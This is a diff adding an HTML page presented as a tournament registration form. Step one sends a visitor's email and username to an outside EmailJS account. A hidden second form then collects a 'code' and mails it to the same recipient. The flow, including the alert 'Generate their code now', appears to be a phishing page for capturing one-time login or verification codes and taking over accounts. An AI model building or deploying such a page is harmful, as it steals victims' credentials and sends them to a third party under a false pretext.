@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tournament Registration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #111;
+            color: white;
+            padding: 40px;
+        }
+
+        .field {
+            margin-bottom: 15px;
+        }
+
+        .field label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .field input {
+            width: 300px;
+            padding: 10px;
+            border-radius: 6px;
+            border: none;
+            font-size: 16px;
+        }
+
+        #button, #button2 {
+            padding: 12px 20px;
+            background: #007bff;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        #button:active, #button2:active {
+            background: #005fcc;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Register for Tournament</h2>
+
+    <!-- STEP 1 FORM -->
+    <form id="form1">
+        <div class="field">
+            <label for="email">Email</label>
+            <input type="text" id="email" name="email">
+        </div>
+
+        <div class="field">
+            <label for="user">Username</label>
+            <input type="text" id="user" name="user">
+        </div>
+
+        <input type="submit" id="button" value="Send Info">
+    </form>
+
+    <!-- STEP 2 FORM (hidden until you generate code) -->
+    <form id="form2" style="display:none; margin-top:30px;">
+        <div class="field">
+            <label for="code">Enter Code</label>
+            <input type="text" id="code" name="code">
+        </div>
+
+        <input type="submit" id="button2" value="Submit Code">
+    </form>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+        emailjs.init("3rphS2MboBzv8WNqe");
+
+        // STEP 1 — Send email + username
+        document.getElementById('form1').addEventListener('submit', function(event) {
+            event.preventDefault();
+            document.getElementById('button').value = "Sending...";
+
+            const emailVal = document.getElementById("email").value;
+            const userVal = document.getElementById("user").value;
+
+            emailjs.send("service_5v15x9m", "template_mk1xa83", {
+                title: `NEW USER | ${userVal}`,
+                message: `Email: ${emailVal}\nUsername: ${userVal}`
+            })
+            .then(() => {
+                document.getElementById('button').value = "Send Info";
+
+                alert("User info sent! Generate their code now.");
+
+                // SHOW STEP 2 FORM
+                document.getElementById("form2").style.display = "block";
+            })
+            .catch((err) => {
+                document.getElementById('button').value = "Send Info";
+                alert("Error: " + JSON.stringify(err));
+            });
+        });
+
+        // STEP 2 — Send code
+        document.getElementById('form2').addEventListener('submit', function(event) {
+            event.preventDefault();
+            document.getElementById('button2').value = "Sending...";
+
+            const codeVal = document.getElementById("code").value;
+
+            emailjs.send("service_5v15x9m", "template_mk1xa83", {
+                title: `CODE SUBMITTED`,
+                message: `Code: ${codeVal}`
+            })
+            .then(() => {
+                document.getElementById('button2').value = "Submit Code";
+                alert("Code sent!");
+            })
+            .catch((err) => {
+                document.getElementById('button2').value = "Submit Code";
+                alert("Error: " + JSON.stringify(err));
+            });
+        });
+    </script>
+
+</body>
+</html>
